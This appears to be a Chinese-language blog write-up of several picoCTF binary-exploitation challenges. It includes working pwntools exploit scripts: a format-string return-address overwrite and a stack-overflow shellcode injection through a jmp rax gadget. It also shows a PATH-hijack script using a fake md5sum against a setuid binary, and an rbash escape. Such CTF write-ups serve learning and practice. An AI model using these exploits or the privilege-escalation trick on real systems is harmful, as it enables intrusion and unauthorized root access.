---
title: picoCTF PWN WP
date: '2025-03-11 17:56:24'
updated: '2025-04-07 21:33:52'
---
## PIE
直接 nc 上去利用二进制文件里面的偏移算出来 print_flag 函数的地址输入就可以获得 flag

## PIE2
多了个格式化字符串利用，最好直接泄露到栈上的返回地址，如果直接`%p`泄露前面几个寄存器的值，远程可能不一定正确

## hash-only-1
好抽象的题目，C++程序比较简单勉强看懂了，程序直接用bash把flag.txt传给`md5num`加密了之后打印出来就结束了，程序无从下手，后面看协作文档压根想不到是改`md5num`来把flag打印出来

### 协作文档
不像是pwn，已经给了shell，但权限不够，flag位于 /root/flag.txt ,但没有权限进root目录，运行二进制程序只能拿到md5的值，而且这个二进制程序没有交互，似乎也没有漏洞？

```c
bool main(void)

{
  ostream *poVar1;
  char *__command;
  long in_FS_OFFSET;
  bool bVar2;
  allocator local_4d;
  int local_4c;
  string local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  poVar1 = std::operator<<((ostream *)std::cout,"Computing the MD5 hash of /root/flag.txt.... ");
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,std::endl<>);
  std::ostream::operator<<(poVar1,std::endl<>);
  sleep(2);
  std::allocator<char>::allocator();
                    /* try { // try from 001013aa to 001013ae has its CatchHandler @ 0010144f */
  std::string::string(local_48,"/bin/bash -c \'md5sum /root/flag.txt\'",&local_4d);
  std::allocator<char>::~allocator((allocator<char> *)&local_4d);
  setgid(0);
  setuid(0);
  __command = (char *)std::string::c_str();
                    /* try { // try from 001013de to 00101423 has its CatchHandler @ 0010146d */
  local_4c = system(__command);
  bVar2 = local_4c != 0;
  if (bVar2) {
    poVar1 = std::operator<<((ostream *)std::cerr,"Error: system() call returned non-zero value: ");
    poVar1 = (ostream *)std::ostream::operator<<(poVar1,local_4c);
    std::ostream::operator<<(poVar1,std::endl<>);
  }
  std::string::~string(local_48);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return bVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

`md5sum` 是直接从PATH拿到的，直接整个假的 `md5sum` 就行

```plain
echo '#!/bin/sh' >> md5sum
echo 'cat $@' >> md5sum
chmod +x md5sum
PATH=".:$PATH" ./flaghasher
```

## hash-only-2
题目直接没给二进制文件，这真的算 pwn 题吗？

### 协作文档
同hash-only-1

但进入的是rbash，启动bash即可解决所有限制

剩下的没有区别

## Echo Valley
程序一直循环有 printf，可以多次输入获得栈上的栈地址和程序地址

然后再利用 fmtstr_payload 格式化字符串任意地址写

把返回地址改成 print_flag 的地址

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=remote("shape-facility.picoctf.net",53062)
# link=process("./valley")

link.recvuntil(b'Shouting: \n')
link.sendline(b'%20$p')

link.recvuntil(b'distance: ')
rbpaddr=int(link.recvline()[:14],16)
print(hex(rbpaddr))
retaddr_ptr=rbpaddr-0x8
print(hex(retaddr_ptr))

link.sendline(b'%21$p')

link.recvuntil(b'distance: ')
binarybase=int(link.recvline()[:14],16)-0x1413
print(hex(binarybase))
print_flag=binarybase+0x126e
print(hex(print_flag))

# gdb.attach(link,'b *$rebase(0x13e1)')
# pause()

payload = fmtstr_payload(6, {retaddr_ptr:print_flag},0,write_size="short")
link.sendline(payload)

link.sendline(b'exit')

link.interactive()
```

## Handoff
![](/images/c4d1289e3fe91596f71f118d086eebd8.png)

栈可执行，程序退出前有一次栈溢出，可以多次往栈上输入数据，

动调发现可以利用 rax 寄存器中遗留的栈地址，

而最后那次有栈溢出的输入地址就是 rax 的地址

程序当中还有`jmp rax`的 gadget 可以利用，大体思路：

+ 先覆盖返回地址到`jmp rax`，
+ 然后再跳转到 payload 开头（也就是 rax 的地址）的十几个字节的指令，
+ 最后再跳转到之前程序输入的时候布置在栈上面的 shellcode

刚开始写的跳转指令是：

```python
jmp_shellcode=asm('''
    sub rax,0x284;
    jmp rax;
''')
```

结果动调发现执行到后面`jmp rax`指令被改动了，看了看原来是程序返回前还在字符串末尾加上了 0，原本紧挨着 rbp 的 jmp_shellcode 就被覆盖了一部分

![](/images/5f0461357d873b7d0c47f1e81b8b1fdf.png)

看来要用短一点的跳转指令才行，突然想到刚才就是通过 ROP 执行的`jmp rax`，直接把跳转指令里面`jmp rax`换成`ret`，再在 ROP 链结尾再加个`jmp rax`，

这样跳转指令的部分就变短了，不会被覆盖

最终 exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=remote("shape-facility.picoctf.net",62438)
# link=process("./handoff")

link.recvuntil(b'app')
link.sendline(b'1')
link.recvuntil(b'name:')
link.sendline(b'1')
link.recvuntil(b'app')
link.sendline(b'1')
link.recvuntil(b'name:')
link.sendline(b'1')

link.recvuntil(b'app')
link.sendline(b'2')
link.recvuntil(b'message to?')
link.sendline(b'1')
link.recvuntil(b'send them?')
link.sendline(asm(shellcraft.sh()))

distance=-0x284
jmp_shellcode=asm('''
    sub rax,0x284;
    ret;
''')
jmp_rax=0x4011AE

link.recvuntil(b'app')
link.sendline(b'3')
payload=jmp_shellcode.ljust(0x14,b'a')+p64(jmp_rax)+p64(jmp_rax)

# gdb.attach(link,'b *0x4013ED')
# pause()

link.recvuntil(b'appreciate it:')
link.sendline(payload)

# gdb.attach(link)
# pause()

link.interactive()
```

